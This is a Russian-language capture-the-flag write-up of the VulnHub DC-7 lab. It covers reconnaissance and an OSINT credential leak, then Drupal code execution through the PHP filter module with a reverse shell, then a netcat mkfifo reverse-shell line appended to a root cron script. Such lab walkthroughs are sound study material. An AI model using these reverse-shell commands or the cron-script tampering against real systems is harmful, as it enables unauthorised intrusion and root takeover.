---
title: DC-7
tags: [vulnhub, writeup, drupal, osint, cron, privesc]
author: mapanit
date: 2026-06-10
difficulty: Beginner
target_ip: 10.0.2.3
attacker_ip: 10.0.2.15
---

# VulnHub: DC-7 Machine

> **Author:** mapanit
> **Date:** 10.06.2026
> **Target IP:** `10.0.2.3`
> **Attacker IP:** `10.0.2.15`
> **Difficulty:** Beginner

---

## Сканирование портов

```bash
nmap -sC -sV 10.0.2.3
```

![](images/DC-7-01.png)

- `-sV` — определение версии службы
- `-sC` — запуск скриптов по умолчанию

**Результат:** доступны два порта:

- `22` — SSH
- `80` — HTTP

## Сбор информации

![998](images/DC-7-02.png)

Сканирование сайта с помощью Nikto:

```bash
nikto -h http://10.0.2.3
```

![1081](images/DC-7-03.png)

Результат:

- Обнаружена версия **Drupal** и **Apache 2.4.25**
- Доступны служебные файлы (`INSTALL.txt`, `LICENSE.txt`, `robots.txt` с ~40 записями)
- Отсутствуют защитные заголовки (CSP, HSTS, Referrer-Policy и др.)
- Разрешены методы HTTP `GET` и `POST`

Эти находки указывают на потенциальные уязвимости веб-сервера, которые стоит проверить дальше.

## Перечисление каталогов

```bash
gobuster dir -u http://10.0.2.3 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,sh,js,bak
```

Значимых результатов не найдено — скрытых директорий/файлов брутфорсом обнаружить не удалось.

![943](images/DC-7-04.png)

## OSINT

На главной странице сайта в футере обнаружена подсказка — юзернейм `DC7USER`. Поиск по этому нику (в том числе через Google dorking) привёл к GitHub-аккаунту с ником `dc7user`.

![907](images/DC-7-02.png)

![904](images/DC-7-05.png)

На аккаунте найден единственный репозиторий — **staffdb**, содержащий исходный код уязвимого сайта. В файле `config.php` в открытом виде обнаружены учётные данные:

![874](images/DC-7-06.png)

![863](images/DC-7-07.png)

```
username = dc7user
password = MdR3xOgB7#dW
```

## Первичный доступ

С полученными учётными данными выполнен вход по SSH:

```bash
ssh dc7user@10.0.2.3
```

![813](images/DC-7-08.png)

Вход выполнен успешно.

## Повышение привилегий внутри Drupal

Внутри системы обнаружен `drush` — инструмент командной строки для администрирования Drupal (CMS с открытым исходным кодом на PHP). Drush позволяет управлять сайтом напрямую из терминала, в том числе — сбрасывать пароли пользователей без доступа к веб-интерфейсу.

![](images/DC-7-09.png)

![765](images/DC-7-10.png)

Сброс пароля администратора:

```bash
drush user-password admin --password=123456
```

![](images/DC-7-11.png)

Выполнен вход на `http://10.0.2.3/user/login`:

- **User:** `admin`
- **Password:** `123456`

## Удалённое выполнение кода

Получив доступ к консоли администратора Drupal, установлен модуль **PHP filter**, позволяющий вставлять и исполнять произвольный PHP-код внутри контента страницы:

```
Manage > Extend > List > Install new module
```

Модуль загружен по прямой ссылке на пакет для Drupal и установлен.

![788](images/DC-7-12.png)

![](images/DC-7-13.png)

![797](images/DC-7-14.png)

Далее создана новая страница:

```
Content > Add content > Basic page
```

- В теле страницы (`body`) вставлен PHP reverse-shell скрипт (pentestmonkey php-reverse-shell), IP и порт скрипта настроены на атакующую машину.
- Формат текста поля `body` изменён на **PHP code**.

На стороне атакующего запущен листенер:

```bash
sudo nc -lvnp 1234
```

После нажатия **Preview** на созданной странице код исполнился, и в терминале с листенером получена reverse-shell сессия от имени `www-data`.

![](images/DC-7-15.png)

![](images/DC-7-16.png)

![703](images/DC-7-17.png)
## Локальное повышение привилегий

Обнаружено, что `www-data` имеет право выполнять/изменять `/opt/scripts/backup.sh` без пароля.

Для получения интерактивной bash-оболочки сгенерирован payload с помощью msfvenom:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=10.0.2.15 lport=8889 R
```

![](images/DC-7-18.png)

На атакующей машине запущен второй листенер:

```bash
nc -lvnp 8889
```

![810](images/DC-7-19.png)

Сгенерированная команда дописана в конец файла `backup.sh`:

```bash
echo "mkfifo /tmp/trsgux; nc 10.0.2.15 8889 0</tmp/trsgux | /bin/sh >/tmp/trsgux 2>&1; rm /tmp/trsgux" >> /opt/scripts/backup.sh
```

![838](images/DC-7-20.png)

Файл `backup.sh` запускается по расписанию (cron) от имени `root`. После срабатывания задачи на листенере `8889` получена root-оболочка.

![860](images/DC-7-21.png)

---

*Готово.*
